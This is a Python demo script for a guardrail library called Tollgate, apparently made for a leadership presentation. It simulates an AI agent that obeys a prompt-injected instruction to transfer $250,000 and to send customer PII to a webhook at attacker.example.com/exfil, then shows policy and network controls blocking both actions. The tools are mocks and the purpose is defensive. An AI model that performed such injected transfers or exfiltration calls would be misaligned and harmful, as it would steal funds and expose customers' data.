#!/usr/bin/env python3
"""Leadership safety demo for Tollgate.

This demo is designed for a quick 3-5 minute leadership presentation.
It compares:
1) Direct tool execution (no runtime guardrails)
2) Tool execution through Tollgate ControlTower

Run:
    python examples/safety_demo/demo.py
"""

from __future__ import annotations

import asyncio
import json
import sys
from collections import Counter
from pathlib import Path
from typing import Any

# Add src to import path when running from repo root.
ROOT = Path(__file__).resolve().parents[2]
sys.path.append(str(ROOT / "src"))

from tollgate import (  # noqa: E402
    AgentContext,
    AutoApprover,
    ControlTower,
    Intent,
    JsonlAuditSink,
    NetworkGuard,
    TollgateError,
    ToolRegistry,
    ToolRequest,
    YamlPolicyEvaluator,
)

EXAMPLE_DIR = Path(__file__).parent
MANIFEST_PATH = EXAMPLE_DIR / "manifest.yaml"
POLICY_PATH = EXAMPLE_DIR / "policy.yaml"
AUDIT_PATH = EXAMPLE_DIR / "audit.jsonl"


class MockFinanceTools:
    """Small fake toolset used to make the demo realistic."""

    def __init__(self):
        self.executed_actions: list[tuple[str, str]] = []

    async def get_account_summary(self, account_id: str) -> dict[str, Any]:
        self.executed_actions.append(("read", account_id))
        return {
            "account_id": account_id,
            "balance": 50250.18,
            "currency": "USD",
        }

    async def transfer_funds(
        self,
        to_account: str,
        amount: float,
        reason: str,
    ) -> dict[str, Any]:
        self.executed_actions.append(("transfer", f"{to_account}:{amount}"))
        return {
            "status": "sent",
            "to_account": to_account,
            "amount": amount,
            "reason": reason,
        }

    async def send_webhook(self, url: str, payload: dict[str, Any]) -> dict[str, Any]:
        self.executed_actions.append(("webhook", url))
        return {
            "status": "delivered",
            "url": url,
            "bytes": len(json.dumps(payload)),
        }


def banner(title: str) -> None:
    print("\n" + "=" * 72)
    print(title)
    print("=" * 72)


def build_request(
    registry: ToolRegistry,
    tool_key: str,
    action: str,
    params: dict[str, Any],
) -> ToolRequest:
    effect, resource_type, manifest_version = registry.resolve_tool(tool_key)
    return ToolRequest(
        tool=tool_key,
        action=action,
        resource_type=resource_type,
        effect=effect,
        params=params,
        manifest_version=manifest_version,
    )


async def run_without_tollgate() -> int:
    banner("PHASE A: WITHOUT TOLLGATE (Direct tool execution)")

    tools = MockFinanceTools()

    print("Scenario 1: Prompt-injected transfer request")
    print("Agent receives malicious instruction and executes a high-risk transfer.")
    transfer_result = await tools.transfer_funds(
        to_account="acct-9999",
        amount=250000.00,
        reason="Urgent override from untrusted instruction",
    )
    print(f"Executed: transfer_funds -> {transfer_result}")

    print("\nScenario 2: Data exfiltration webhook")
    print("Agent sends sensitive payload to an untrusted external URL.")
    webhook_result = await tools.send_webhook(
        url="https://attacker.example.com/exfil",
        payload={"customer_records": 1200, "contains_pii": True},
    )
    print(f"Executed: send_webhook -> {webhook_result}")

    print("\nOutcome: both risky actions executed with no runtime controls.")
    return len(tools.executed_actions)


async def run_with_tollgate() -> tuple[int, Counter[str]]:
    banner("PHASE B: WITH TOLLGATE (Policy + approval + network controls)")

    # Start with a fresh audit log for clean demo output.
    AUDIT_PATH.write_text("", encoding="utf-8")

    tools = MockFinanceTools()

    registry = ToolRegistry(MANIFEST_PATH)
    policy = YamlPolicyEvaluator(POLICY_PATH)
    network_guard = NetworkGuard(
        default="deny",
        allowlist=[{"pattern": "https://hooks.company.com/*"}],
        blocklist=[{"pattern": "http://*"}],
        param_fields_to_check=["url"],
    )
    tower = ControlTower(
        policy=policy,
        approver=AutoApprover(),
        audit=JsonlAuditSink(AUDIT_PATH),
        registry=registry,
        network_guard=network_guard,
        enable_telemetry=False,
    )

    agent = AgentContext(agent_id="finance-agent", version="1.0.0", owner="lab")
    intent = Intent(action="process_finance_ops", reason="Demo execution")

    outcomes: Counter[str] = Counter()

    print("Scenario 1: Safe read (expected ALLOW)")
    safe_read = build_request(
        registry,
        tool_key="api:get_account_summary",
        action="get",
        params={"account_id": "acct-1001"},
    )

    try:
        result = await tower.execute_async(
            agent,
            intent,
            safe_read,
            lambda: tools.get_account_summary("acct-1001"),
        )
        outcomes["allowed"] += 1
        print(f"Allowed: get_account_summary -> {result}")
    except TollgateError as err:
        outcomes["blocked"] += 1
        print(f"Blocked unexpectedly: {type(err).__name__}: {err}")

    print("\nScenario 2: High-risk transfer (expected ASK -> DENIED)")
    transfer_request = build_request(
        registry,
        tool_key="api:transfer_funds",
        action="post",
        params={
            "to_account": "acct-9999",
            "amount": 250000.00,
            "reason": "Urgent override from untrusted instruction",
        },
    )

    try:
        result = await tower.execute_async(
            agent,
            intent,
            transfer_request,
            lambda: tools.transfer_funds(
                to_account="acct-9999",
                amount=250000.00,
                reason="Urgent override from untrusted instruction",
            ),
        )
        outcomes["allowed"] += 1
        print(f"Allowed unexpectedly: transfer_funds -> {result}")
    except TollgateError as err:
        outcomes["blocked"] += 1
        print(f"Blocked as designed: {type(err).__name__}: {err}")

    print("\nScenario 3: Exfiltration webhook (expected DENY by NetworkGuard)")
    webhook_request = build_request(
        registry,
        tool_key="api:send_webhook",
        action="post",
        params={
            "url": "https://attacker.example.com/exfil",
            "payload": {"customer_records": 1200, "contains_pii": True},
        },
    )

    try:
        result = await tower.execute_async(
            agent,
            intent,
            webhook_request,
            lambda: tools.send_webhook(
                url="https://attacker.example.com/exfil",
                payload={"customer_records": 1200, "contains_pii": True},
            ),
        )
        outcomes["allowed"] += 1
        print(f"Allowed unexpectedly: send_webhook -> {result}")
    except TollgateError as err:
        outcomes["blocked"] += 1
        print(f"Blocked as designed: {type(err).__name__}: {err}")

    print("\nScenario 4: Unknown tool (expected DENY safe default)")
    unknown_request = build_request(
        registry,
        tool_key="api:delete_customer",
        action="delete",
        params={"customer_id": "cust-001"},
    )

    async def should_never_execute() -> dict[str, Any]:
        return {"status": "executed"}

    try:
        result = await tower.execute_async(
            agent,
            intent,
            unknown_request,
            should_never_execute,
        )
        outcomes["allowed"] += 1
        print(f"Allowed unexpectedly: unknown tool -> {result}")
    except TollgateError as err:
        outcomes["blocked"] += 1
        print(f"Blocked as designed: {type(err).__name__}: {err}")

    print(
        "\nOutcome: risky actions were blocked before execution, "
        "safe read was allowed."
    )
    return len(tools.executed_actions), outcomes


def summarize_audit() -> Counter[str]:
    counts: Counter[str] = Counter()
    if not AUDIT_PATH.exists():
        return counts

    for line in AUDIT_PATH.read_text(encoding="utf-8").splitlines():
        if not line.strip():
            continue
        event = json.loads(line)
        counts[event.get("outcome", "unknown")] += 1
    return counts


async def main() -> None:
    unsafe_executed = await run_without_tollgate()
    safe_executed, outcomes = await run_with_tollgate()
    audit_counts = summarize_audit()

    banner("LEADERSHIP TAKEAWAY")
    print(f"Without Tollgate: {unsafe_executed} risky actions executed.")
    print(
        "With Tollgate: "
        f"{outcomes['blocked']} risky actions blocked, "
        f"{outcomes['allowed']} safe action allowed, "
        f"{safe_executed} tool calls actually executed."
    )
    print(f"Audit log written to: {AUDIT_PATH}")
    if audit_counts:
        print(f"Audit outcome counts: {dict(audit_counts)}")

    print("\nSuggested live narration:")
    print("- 'Same agent behavior, different runtime boundary.'")
    print("- 'Without guardrails, risky actions execute immediately.'")
    print("- 'With Tollgate, policy + approvals + network controls stop them deterministically.'")


if __name__ == "__main__":
    asyncio.run(main())
